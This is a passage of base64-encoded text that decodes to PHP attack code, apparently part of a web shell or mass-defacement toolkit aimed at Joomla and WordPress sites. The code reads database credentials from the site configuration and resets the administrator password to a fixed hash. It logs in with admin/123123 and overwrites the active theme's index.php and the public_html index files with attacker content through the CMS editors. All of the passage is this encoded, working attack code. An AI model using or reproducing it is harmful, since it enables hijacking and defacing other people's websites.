goZG91YmxlKW1pY3JvdGltZSgpKjEwMDAwMDApOw0KICAgICRpID0gMDsNCiAgICAkcGFzcyA9ICcnOw0KICAgIHdoaWxlICgkaSA8PSA3KSB7DQogICAgICAgICRudW0gPSByYW5kKCkgJSAzMzsNCiAgICAgICAgJHRtcCA9IHN1YnN0cigkY2hhcnMsICRudW0sIDEpOw0KICAgICAgICAkcGFzcyA9ICRwYXNzIC4gJHRtcDsNCiAgICAgICAgJGkrKzsNCiAgICB9DQogICAgcmV0dXJuICRwYXNzOw0KfQ0KDQovLyBqb29tbGEgaW5kZXggY2hhbmdlcg0KZnVuY3Rpb24gaW5kZXhfY2hhbmdlcl9qb29tbGEoJGNvbmYsICRpbmRleF9zaXRlLCAkZG9tYWluKSB7DQoNCiRjb250ZW50ID0gZmlsZV9nZXRfY29udGVudHMoJGluZGV4X3NpdGUpOw0KICAgICRkb2xlciA9ICckJzsNCiAgICAkdXNlcm5hbWUgPSB0dW5pc2lhKCRjb25mLCAkZG9sZXIuInVzZXIgPSAnIiwgIic7Iik7DQogICAgJHBhc3N3b3JkID0gdHVuaXNpYSgkY29uZiwgJGRvbGVyLiJwYXNzd29yZCA9ICciLCAiJzsiKTsNCiAgICAkZGJuYW1lID0gdHVuaXNpYSgkY29uZiwgJGRvbGVyLiJkYiA9ICciLCAiJzsiKTsNCiAgICAkcHJlZml4ID0gdHVuaXNpYSgkY29uZiwgJGRvbGVyLiJkYnByZWZpeCA9ICciLCAiJzsiKTsNCiAgICAkaG9zdCA9IHR1bmlzaWEoJGNvbmYsICRkb2xlci4iaG9zdCA9ICciLCInOyIpOw0KICAgICRjbz1yYW5kb210KCk7DQogICAgJHNpdGVfdXJsID0gImh0dHA6Ly8iLiRkb21haW4uIi9hZG1pbmlzdHJhdG9yIjsNCiAgICAkb3V0cHV0ID0gJyc7DQogICAgJGNvbmQgPSAwOyANCiAgICAkbGluaz1teXNxbF9jb25uZWN0KCRob3N0LCAkdXNlcm5hbWUsICRwYXNzd29yZCk7DQogICAgaWYoJGxpbmspIHsNCiAgICAgICAgbXlzcWxfc2VsZWN0X2RiKCRkYm5hbWUsJGxpbmspIDsNCiAgICAgICAgJHJlcTEgPSBteXNxbF9xdWVyeSgiVVBEQVRFIGAiLiRwcmVmaXguInVzZXJzYCBTRVQgYHVzZXJuYW1lYCA9J2FkbWluJyAsIGBwYXNzd29yZGAgPSAnNDI5N2Y0NGIxMzk1NTIzNTI0NWIyNDk3Mzk5ZDdhOTMnLCBgdXNlcnR5cGVgID0gJ1N1cGVyIEFkbWluaXN0cmF0b3InLCBgYmxvY2tgID0gMCIpOw0KICAgICAgICAkcmVxID0gbXlzcWxfbnVtcm93cyhteXNxbF9xdWVyeSgiU0hPVyBUQUJMRVMgTElLRSAnIi4kcHJlZml4LiJleHRlbnNpb25zJyIpKTsNCiAgICB9IGVsc2Ugew0KICAgICAgICAkb3V0cHV0Lj0gIlstXSBEQiBFcnJvcjxiciAvPiI7DQogICAgfQ0KICAgIA0KICAgIGlmKCRyZXExKXsNCiAgICAgICAgaWYgKCRyZXEpIHsNCiRyZXEgPSBteXNxbF9xdWVyeSgiU0VMRUNUICogZnJvbSAgYCIuJHByZWZpeC4idGVtcGxhdGVfc3R5bGVzYCBXSEVSRSBgY2xpZW50X2lkYCA9ICcwJyBhbmQgYGhvbWVgID0gJzEnIik7DQokZGF0YSA9IG15c3FsX2ZldGNoX2FycmF5KCRyZXEpOw0KJHRlbXBsYXRlX25hbWUgPSAkZGF0YVsidGVtcGxhdGUiXTsNCg0KJHJlcSA9IG15c3FsX3F1ZXJ5KCJTRUxFQ1QgKiBmcm9tICBgIi4kcHJlZml4LiJleHRlbnNpb25zYCBXSEVSRSBgbmFtZWA9JyIuJHRlbXBsYXRlX25hbWUuIicgb3IgYGVsZW1lbnRgID0gJyIuJHRlbXBsYXRlX25hbWUuIiciKTsNCiRkYXRhID0gbXlzcWxfZmV0Y2hfYXJyYXkoJHJlcSk7DQokdGVtcGxhdGVfaWQgPSAkZGF0YVsiZXh0ZW5zaW9uX2lkIl07DQoNCiR1cmwyPSRzaXRlX3VybC4iL2luZGV4LnBocCI7DQokY2ggPSBjdXJsX2luaXQoKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICR1cmwyKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GT0xMT1dMT0NBVElPTiwgMSk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0hFQURFUiwgMCk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVNFUkFHRU5ULCAkdXNlcmFnZW50KTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9DT09LSUVKQVIsICRjbyk7IA0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0NPT0tJRUZJTEUsICRjbyk7IA0KJGJ1ZmZlciA9IGN1cmxfZXhlYygkY2gpOw0KJHJldHVybiA9IHR1bmlzaWEoJGJ1ZmZlciAsJzxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InJldHVybiIgdmFsdWU9IicsJyInKTsNCiRoaWRkZW4gPSB0dW5pc2lhKCRidWZmZXIgLCc8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSInLCciIHZhbHVlPSIxIicsNCk7DQoNCmlmKCRyZXR1cm4gJiYgJGhpZGRlbikgew0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJHVybDIpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1QsIDEpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFRkVSRVIsICR1cmwyKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NURklFTERTLCAidXNlcm5hbWU9YWRtaW4mcGFzc3dkPTEyMzEyMyZvcHRpb249Y29tX2xvZ2luJnRhc2s9bG9naW4mcmV0dXJuPSIuJHJldHVybi4iJiIuJGhpZGRlbi4iPTEiKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GT0xMT1dMT0NBVElPTiwgMSk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0hFQURFUiwgMCk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVNFUkFHRU5ULCAkdXNlcmFnZW50KTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9DT09LSUVKQVIsICRjbyk7IA0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0NPT0tJRUZJTEUsICRjbyk7IA0KJGJ1ZmZlciA9IGN1cmxfZXhlYygkY2gpOw0KJHBvcyA9IHN0cnBvcygkYnVmZmVyLCJjb21fY29uZmlnIik7DQppZigkcG9zID09PSBmYWxzZSkgew0KJG91dHB1dC49ICJbLV0gTG9naW4gRXJyb3I8YnIgLz4iOw0KfSBlbHNlIHsNCiRvdXRwdXQuPSAiWytdIExvZ2luIFN1Y2Nlc3NmdWw8YnIgLz4iOw0KfQ0KfQ0KaWYoJHBvcyl7DQokdXJsMj0kc2l0ZV91cmwuIi9pbmRleC5waHA/b3B0aW9uPWNvbV90ZW1wbGF0ZXMmdGFzaz1zb3VyY2UuZWRpdCZpZD0iLmJhc2U2NF9lbmNvZGUoJHRlbXBsYXRlX2lkLiI6aW5kZXgucGhwIik7DQokY2ggPSBjdXJsX2luaXQoKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICR1cmwyKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GT0xMT1dMT0NBVElPTiwgMSk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0hFQURFUiwgMCk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVNFUkFHRU5ULCAkdXNlcmFnZW50KTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9DT09LSUVKQVIsICRjbyk7IA0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0NPT0tJRUZJTEUsICRjbyk7IA0KJGJ1ZmZlciA9IGN1cmxfZXhlYygkY2gpOw0KDQokaGlkZGVuMj10dW5pc2lhKCRidWZmZXIgLCc8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSInLCciIHZhbHVlPSIxIicsMik7DQppZigkaGlkZGVuMikgew0KJG91dHB1dC49ICJbK10gaW5kZXgucGhwIGZpbGUgZm91bmQgaW4gVGhlbWUgRWRpdG9yPGJyIC8+IjsNCn0gZWxzZSB7DQokb3V0cHV0Lj0gIlstXSBpbmRleC5waHAgTm90IGZvdW5kIGluIFRoZW1lIEVkaXRvcjxiciAvPiI7DQp9DQp9DQppZigkaGlkZGVuMikgew0KJHVybDI9JHNpdGVfdXJsLiIvaW5kZXgucGhwP29wdGlvbj1jb21fdGVtcGxhdGVzJmxheW91dD1lZGl0IjsNCiRjaCA9IGN1cmxfaW5pdCgpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJHVybDIpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1QsIDEpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1RGSUVMRFMsImpmb3JtW3NvdXJjZV09Ii4kY29udGVudC4iJmpmb3JtW2ZpbGVuYW1lXT1pbmRleC5waHAmamZvcm1bZXh0ZW5zaW9uX2lkXT0iLiR0ZW1wbGF0ZV9pZC4iJiIuJGhpZGRlbjIuIj0xJnRhc2s9c291cmNlLnNhdmUiKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GT0xMT1dMT0NBVElPTiwgMSk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0hFQURFUiwgMCk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVNFUkFHRU5ULCAkdXNlcmFnZW50KTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9DT09LSUVKQVIsICRjbyk7IA0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0NPT0tJRUZJTEUsICRjbyk7IA0KJGJ1ZmZlciA9IGN1cmxfZXhlYygkY2gpOw0KY3VybF9jbG9zZSgkY2gpOw0KDQokcG9zID0gc3RycG9zKCRidWZmZXIsJzxkZCBjbGFzcz0ibWVzc2FnZSBtZXNzYWdlIj4nKTsNCiRjb25kID0gMDsNCmlmKCRwb3MgPT09IGZhbHNlKSB7DQokb3V0cHV0Lj0gIlstXSBVcGRhdGluZyBJbmRleC5waHAgRXJyb3I8YnIgLz4iOw0KICAgDQp9IGVsc2Ugew0KJG91dHB1dC49ICJbK10gSW5kZXgucGhwIFRlbXBsYXRlIHN1Y2Nlc3NmdWxseSBzYXZlZDxiciAvPiI7DQokY29uZCA9IDE7DQp9DQp9DQogICAgICAgIH0gDQogICAgICAgIGVsc2Ugew0KJHJlcSA9bXlzcWxfcXVlcnkoIlNFTEVDVCAqIGZyb20gIGAiLiRwcmVmaXguInRlbXBsYXRlc19tZW51YCBXSEVSRSBjbGllbnRfaWQ9JzAnIik7DQokZGF0YSA9IG15c3FsX2ZldGNoX2FycmF5KCRyZXEpOw0KJHRlbXBsYXRlX25hbWU9JGRhdGFbInRlbXBsYXRlIl07DQokdXNlcmFnZW50PSJNb3ppbGxhLzQuMCAoY29tcGF0aWJsZTsgTVNJRSA3LjBiOyBXaW5kb3dzIE5UIDUuMTsgLk5FVCBDTFIgMS4xLjQzMjI7IEFsZXhhIFRvb2xiYXI7IC5ORVQgQ0xSIDIuMC41MDcyNykiOw0KJHVybDI9JHNpdGVfdXJsLiIvaW5kZXgucGhwIjsNCiRjaCA9IGN1cmxfaW5pdCgpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJHVybDIpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0ZPTExPV0xPQ0FUSU9OLCAxKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgMSk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfSEVBREVSLCAwKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9DT05ORUNUVElNRU9VVCwgMTApOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VTRVJBR0VOVCwgJHVzZXJhZ2VudCk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfQ09PS0lFSkFSLCAkY28pOyANCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9DT09LSUVGSUxFLCAkY28pOyANCiRidWZmZXIgPSBjdXJsX2V4ZWMoJGNoKTsNCiRoaWRkZW49dHVuaXNpYSgkYnVmZmVyICwnPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iJywnIiB2YWx1ZT0iMSInLDMpOw0KDQppZigkaGlkZGVuKSB7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsMik7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVCwgMSk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVEZJRUxEUywidXNlcm5hbWU9YWRtaW4mcGFzc3dkPTEyMzQ1NiZvcHRpb249Y29tX2xvZ2luJnRhc2s9bG9naW4mIi4kaGlkZGVuLiI9MSIpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0ZPTExPV0xPQ0FUSU9OLCAxKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgMSk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfSEVBREVSLCAwKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VU0VSQUdFTlQsICR1c2VyYWdlbnQpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0NPT0tJRUpBUiwgJGNvKTsgDQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfQ09PS0lFRklMRSwgJGNvKTsgDQokYnVmZmVyID0gY3VybF9leGVjKCRjaCk7DQokcG9zID0gc3RycG9zKCRidWZmZXIsImNvbV9jb25maWciKTsNCmlmKCRwb3MgPT09IGZhbHNlKSB7DQokb3V0cHV0Lj0gIlstXSBMb2dpbiBFcnJvcjxiciAvPiI7DQp9IGVsc2Ugew0KJG91dHB1dC49ICJbK10gTG9naW4gU3VjY2Vzc2Z1bDxiciAvPiI7DQp9DQp9DQoNCmlmKCRwb3MpIHsNCiR1cmwyPSRzaXRlX3VybC4iL2luZGV4LnBocD9vcHRpb249Y29tX3RlbXBsYXRlcyZ0YXNrPWVkaXRfc291cmNlJmNsaWVudD0wJmlkPSIuJHRlbXBsYXRlX25hbWU7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsMik7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRk9MTE9XTE9DQVRJT04sIDEpOw0KY3VybF9zZXRvcHQoJGNoLENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsMSk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfSEVBREVSLCAwKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VU0VSQUdFTlQsICR1c2VyYWdlbnQpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0NPT0tJRUpBUiwgJGNvKTsgDQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfQ09PS0lFRklMRSwgJGNvKTsgDQokYnVmZmVyID0gY3VybF9leGVjKCRjaCk7DQokaGlkZGVuMj10dW5pc2lhKCRidWZmZXIgLCc8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSInLCciIHZhbHVlPSIxIicsNik7DQppZigkaGlkZGVuMikgew0KJG91dHB1dC49ICJbK10gaW5kZXgucGhwIGZpbGUgZm91bmRlZCBpbiBUaGVtZSBFZGl0b3I8YnIgLz4iOw0KfSBlbHNlIHsNCiRvdXRwdXQuPSAiWy1dIGluZGV4LnBocCBOb3QgZm91bmQgaW4gVGhlbWUgRWRpdG9yPGJyIC8+IjsNCn0NCn0NCg0KaWYoJGhpZGRlbjIpIHsNCiR1cmwyPSRzaXRlX3VybC4iL2luZGV4LnBocD9vcHRpb249Y29tX3RlbXBsYXRlcyZsYXlvdXQ9ZWRpdCI7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsMik7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVCwgMSk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVEZJRUxEUywiZmlsZWNvbnRlbnQ9Ii4kY29udGVudC4iJmlkPSIuJHRlbXBsYXRlX25hbWUuIiZjaWRbXT0iLiR0ZW1wbGF0ZV9uYW1lLiImIi4kaGlkZGVuMi4iPTEmdGFzaz1zYXZlX3NvdXJjZSZjbGllbnQ9MCIpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0ZPTExPV0xPQ0FUSU9OLCAxKTsNCmN1cmxfc2V0b3B0KCRjaCxDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLDEpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0hFQURFUiwgMCk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVNFUkFHRU5ULCAkdXNlcmFnZW50KTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9DT09LSUVKQVIsICRjbyk7IA0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0NPT0tJRUZJTEUsICRjbyk7IA0KJGJ1ZmZlciA9IGN1cmxfZXhlYygkY2gpOw0KY3VybF9jbG9zZSgkY2gpOw0KDQokcG9zID0gc3RycG9zKCRidWZmZXIsJzxkZCBjbGFzcz0ibWVzc2FnZSBtZXNzYWdlIGZhZGUiPicpOw0KJGNvbmQgPSAwOw0KaWYoJHBvcyA9PT0gZmFsc2UpIHsNCiRvdXRwdXQuPSAiWy1dIFVwZGF0aW5nIEluZGV4LnBocCBFcnJvcjxiciAvPiI7DQp9IGVsc2Ugew0KJG91dHB1dC49ICJbK10gSW5kZXgucGhwIFRlbXBsYXRlIHN1Y2Nlc3NmdWxseSBzYXZlZDxiciAvPiI7DQokY29uZCA9IDE7DQp9DQp9DQogICAgICAgIH0NCiAgICB9IGVsc2Ugew0KICAgICAgICAkb3V0cHV0Lj0gIlstXSBEQiBFcnJvcjxiciAvPiI7DQogICAgfQ0KICAgIGdsb2JhbCAkYmFzZV9wYXRoOw0KICAgIHVubGluaygkYmFzZV9wYXRoLiRjbyk7DQogICAgcmV0dXJuIGFycmF5KCdjb25kJz0+JGNvbmQsICdvdXRwdXQnPT4kb3V0cHV0ICwgJ3RlbXBsYXRlJz0+JHRlbXBsYXRlX25hbWUpOyANCn0NCg0KDQovLyB3b3JkcHJlc3MgaW5kZXggY2hhbmdlcg0KDQpmdW5jdGlvbiBpbmRleF9jaGFuZ2VyX3dwKCRjb25mLCAkaW5kZXgpIHsNCiRkb2wgPSAnJCc7DQokcHJlaW5kZXggPSAiPD9waHANCiIuJGRvbC4iZGVmID0gZmlsZV9nZXRfY29udGVudHMoJyIuJGluZGV4LiInKTsNCiIuJGRvbC4icCA9IGV4cGxvZGUoJ3B1YmxpY19odG1sJyxkaXJuYW1lKF9fRklMRV9fKSk7DQoiLiRkb2wuInAgPSAiLiRkb2wuInBbMF0uJ3B1YmxpY19odG1sJzsNCmlmICgiLiRkb2wuImhhbmRsZSA9IG9wZW5kaXIoIi4kZG9sLiJwKSkgew0KICAgICIuJGRvbC4icDEgPSBAZm9wZW4oIi4kZG9sLiJwLicvaW5kZXguaHRtbCcsJ3crJyk7DQogICAgQGZ3cml0ZSgiLiRkb2wuImZwMSwgIi4kZG9sLiJkZWYpOw0KICAgICIuJGRvbC4icDEgPSBAZm9wZW4oIi4kZG9sLiJwLicvaW5kZXgucGhwJywndysnKTsNCiAgICBAZndyaXRlKCIuJGRvbC4iZnAxLCAiLiRkb2wuImRlZik7DQogICAgIi4kZG9sLiJmcDEgPSBAZm9wZW4oIi4kZG9sLiJwLicvaW5kZXguaHRtJywndysnKTsNCiAgICBAZndyaXRlKCIuJGRvbC4iZnAxLCAiLiRkb2wuImRlZik7DQogICAgZWNobyAnRG9uZSc7DQp9DQpjbG9zZWRpcigiLiRkb2wuImhhbmRsZSk7DQp1bmxpbmsoX19GSUxFX18pOw0KPz4iOw0KJGNvbnRlbnQgPSBiYXNlNjRfZW5jb2RlKCRwcmVpbmRleCk7DQogICAgJG91dHB1dCA9ICcnOw0KICAgICRkb2wgPSAnJCc7DQogICAgJGdvID0gMDsNCiAgICAkdXNlcm5hbWUgPSB0dW5pc2lhKCRjb25mLCJkZWZpbmUoJ0RCX1VTRVInLCAnIiwiJyk7Iik7DQogICAgJHBhc3N3b3JkID0gdHVuaXNpYSgkY29uZiwiZGVmaW5lKCdEQl9QQVNTV09SRCcsICciLCInKTsiKTsNCiAgICAkZGJuYW1lID0gdHVuaXNpYSgkY29uZiwiZGVmaW5lKCdEQl9OQU1FJywgJyIsIicpOyIpOw0KICAgICRwcmVmaXggPSB0dW5pc2lhKCRjb25mLCRkb2wuInRhYmxlX3ByZWZpeCAgPSAnIiwiJyIpOw0KICAgICRob3N0ID0gdHVuaXNpYSgkY29uZiwiZGVmaW5lKCdEQl9IT1NUJywgJyIsIicpOyIpOw0KDQogICAgJGxpbms9bXlzcWxfY29ubmVjdCgkaG9zdCwkdXNlcm5hbWUsJHBhc3N3b3JkKTsNCiAgICBpZigkbGluaykgew0KICAgICAgICBteXNxbF9zZWxlY3RfZGIoJGRibmFtZSwkbGluaykgOw0KICAgICAgICAkZG9sID0gJyQnOw0KICAgICAgICAkcmVxMSA9IG15c3FsX3F1ZXJ5KCJVUERBVEUgYCIuJHByZWZpeC4idXNlcnNgIFNFVCBgdXNlcl9sb2dpbmAgPSAnYWRtaW4nLGB1c2VyX3Bhc3NgID0gJzQyOTdmNDRiMTM5NTUyMzUyNDViMjQ5NzM5OWQ3YTkzJyBXSEVSRSBgSURgID0gMSIpOw0KICAgIH0gZWxzZSB7DQogICAgICAgICRvdXRwdXQuPSAiWy1dIERCIEVycm9yPGJyIC8+IjsNCiAgICB9DQogICAgaWYoJHJlcTEpIHsNCg0KICAgICAgICAkcmVxID0gbXlzcWxfcXVlcnkoIlNFTEVDVCAqIGZyb20gIGAiLiRwcmVmaXguIm9wdGlvbnNgIFdIRVJFIG9wdGlvbl9uYW1lPSdob21lJyIpOw0KICAgICAgICAkZGF0YSA9IG15c3FsX2ZldGNoX2FycmF5KCRyZXEpOw0KICAgICAgICAkc2l0ZV91cmw9JGRhdGFbIm9wdGlvbl92YWx1ZSJdOyANCg0KICAgICAgICAkcmVxID0gbXlzcWxfcXVlcnkoIlNFTEVDVCAqIGZyb20gIGAiLiRwcmVmaXguIm9wdGlvbnNgIFdIRVJFIG9wdGlvbl9uYW1lPSd0ZW1wbGF0ZSciKTsNCiAgICAgICAgJGRhdGEgPSBteXNxbF9mZXRjaF9hcnJheSgkcmVxKTsNCiAgICAgICAgJHRlbXBsYXRlID0gJGRhdGFbIm9wdGlvbl92YWx1ZSJdOw0KDQogICAgICAgICRyZXEgPSBteXNxbF9xdWVyeSgiU0VMRUNUICogZnJvbSAgYCIuJHByZWZpeC4ib3B0aW9uc2AgV0hFUkUgb3B0aW9uX25hbWU9J2N1cnJlbnRfdGhlbWUnIik7DQogICAgICAgICRkYXRhID0gbXlzcWxfZmV0Y2hfYXJyYXkoJHJlcSk7DQogICAgICAgICRjdXJyZW50X3RoZW1lID0gJGRhdGFbIm9wdGlvbl92YWx1ZSJdOw0KDQogICAgICAgICR1c2VyYWdlbnQ9Ik1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDcuMGI7IFdpbmRvd3MgTlQgNS4xOyAuTkVUIENMUiAxLjEuNDMyMjsgQWxleGEgVG9vbGJhcjsgLk5FVCBDTFIgMi4wLjUwNzI3KSI7DQogICAgICAgICR1cmwyPSRzaXRlX3VybC4iL3dwLWxvZ2luLnBocCI7DQoNCiAgICAgICAgJGNoID0gY3VybF9pbml0KCk7DQogICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICR1cmwyKTsNCiAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1QsIDEpOw0KICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVEZJRUxEUywibG9nPWFkbWluJnB3ZD0xMjMxMjMmcmVtZW1iZXJtZT1mb3JldmVyJndwLXN1Ym1pdD1Mb2cgSW4mdGVzdGNvb2tpZT0xIik7DQogICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GT0xMT1dMT0NBVElPTiwgMSk7DQogICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwxKTsNCiAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0hFQURFUiwgMCk7DQogICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9DT05ORUNUVElNRU9VVCwgMTApOw0KICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVNFUkFHRU5ULCAkdXNlcmFnZW50KTsNCiAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0NPT0tJRUpBUiwgIkNPT0tJRS50eHQiKTsNCiAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0NPT0tJRUZJTEUsICJDT09LSUUudHh0Iik7DQogICAgICAgICRidWZmZXIgPSBjdXJsX2V4ZWMoJGNoKTsNCg0KICAgICAgICAkcG9zID0gc3RycG9zKCRidWZmZXIsImFjdGlvbj1sb2dvdXQiKTsNCiAgICAgICAgaWYoJHBvcyA9PT0gZmFsc2UpIHsNCiRvdXRwdXQuPSAiWy1dIExvZ2luIEVycm9yPGJyIC8+IjsNCiAgICAgICAgfSBlbHNlIHsNCiRvdXRwdXQuPSAiWytdIExvZ2luIFN1Y2Nlc3NmdWw8YnIgLz4iOw0KJGdvID0gMTsNCiAgICAgICAgfQ0KICAgICAgICBpZigkZ28pIHsNCiRjb25kID0gMDsNCiR1cmwyPSRzaXRlX3VybC4iL3dwLWFkbWluL3RoZW1lLWVkaXRvci5waHA/ZmlsZT0vdGhlbWVzLyIuJHRlbXBsYXRlLicvaW5kZXgucGhwJnRoZW1lPScudXJsZW5jb2RlKCRjdXJyZW50X3RoZW1lKS4nJmRpcj10aGVtZSc7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsMik7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfRk9MTE9XTE9DQVRJT04sIDApOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLDEpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0hFQURFUiwgMCk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVNFUkFHRU5ULCAkdXNlcmFnZW50KTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9DT09LSUVKQVIsICJDT09LSUUudHh0Iik7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfQ09PS0lFRklMRSwgIkNPT0tJRS50eHQiKTsNCiRidWZmZXIwID0gY3VybF9leGVjKCRjaCk7DQoNCiRfd3Bub25jZSA9IHR1bmlzaWEoJGJ1ZmZlcjAsJzxpbnB1dCB0eXBlPSJoaWRkZW4iIGlkPSJfd3Bub25jZSIgbmFtZT0iX3dwbm9uY2UiIHZhbHVlPSInLCciIC8+Jyk7DQokX2ZpbGUgPSB0dW5pc2lhKCRidWZmZXIwLCc8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJmaWxlIiB2YWx1ZT0iJywnIiAvPicpOw0KDQppZihzdWJzdHJfY291bnQoJF9maWxlLCIvaW5kZXgucGhwIikgIT0gMCl7DQokb3V0cHV0Lj0gIlsrXSBpbmRleC5waHAgbG9hZGVkIGluIFRoZW1lIEVkaXRvcjxiciAvPiI7DQokdXJsMj0kc2l0ZV91cmwuIi93cC1hZG1pbi90aGVtZS1lZGl0b3IucGhwIjsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICR1cmwyKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NULCAxKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NURklFTERTLCJuZXdjb250ZW50PSIuYmFzZTY0X2RlY29kZSgkY29udGVudCkuIiZhY3Rpb249dXBkYXRlJmZpbGU9Ii4kX2ZpbGUuIiZfd3Bub25jZT0iLiRfd3Bub25jZS4iJnN1Ym1pdD1VcGRhdGUgRmlsZSIpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0ZPTExPV0xPQ0